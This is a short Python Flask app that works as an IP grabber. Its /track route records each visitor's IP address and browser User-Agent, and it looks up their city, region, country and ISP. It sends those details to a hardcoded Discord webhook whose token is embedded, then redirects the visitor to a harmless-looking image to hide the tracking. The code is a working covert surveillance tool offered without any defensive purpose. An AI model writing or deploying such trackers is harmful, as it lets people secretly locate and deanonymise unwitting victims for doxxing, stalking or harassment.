from flask import Flask, request, redirect
import requests
import traceback

app = Flask(__name__)

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1360532705644773546/lc5c8r8P_MC-MJRytn7ea7ZaANatkhXlf15_sRYT6Ist5oV5eEM-KtRLUKWYZe0RrgKX"

# Add a root route to handle requests to "/"
@app.route('/')
def home():
    return "Welcome to the tracker!"

@app.route('/track')
def track():
    try:
        ip = request.remote_addr or 'unknown'
        user_agent = request.headers.get('User-Agent', 'unknown')

        # Get geo info from IP (handle possible errors)
        try:
            geo = requests.get(f"https://ipapi.co/{ip}/json/").json()
        except Exception as e:
            geo = {"city": "Unknown", "region": "Unknown", "country_name": "Unknown", "org": "Unknown"}
            print(f"Error fetching geo data: {str(e)}")

        city = geo.get("city", "Unknown")
        region = geo.get("region", "Unknown")
        country = geo.get("country_name", "Unknown")
        org = geo.get("org", "Unknown")

        # Build message
        content = (
            f"👀 Click detected!\n"
            f"🌍 IP: `{ip}`\n"
            f"📍 Location: {city}, {region}, {country}\n"
            f"🏢 ISP: {org}\n"
            f"🖥️ User-Agent: `{user_agent}`"
        )

        # Send to Discord
        try:
            requests.post(WEBHOOK_URL, json={"content": content})
        except Exception as e:
            print(f"Error sending to Discord: {str(e)}")

        # Redirect to a safe placeholder image
        return redirect("https://www.smartage.pl/wp-content/uploads/2023/04/67-1.jpg")
    
    except Exception as e:
        # Log the error and return a friendly message
        print(f"Error in track function: {str(e)}")
        traceback.print_exc()  # This will print detailed error information to the logs
        return "Something went wrong", 500


if __name__ == "__main__":
    app.run(debug=True)
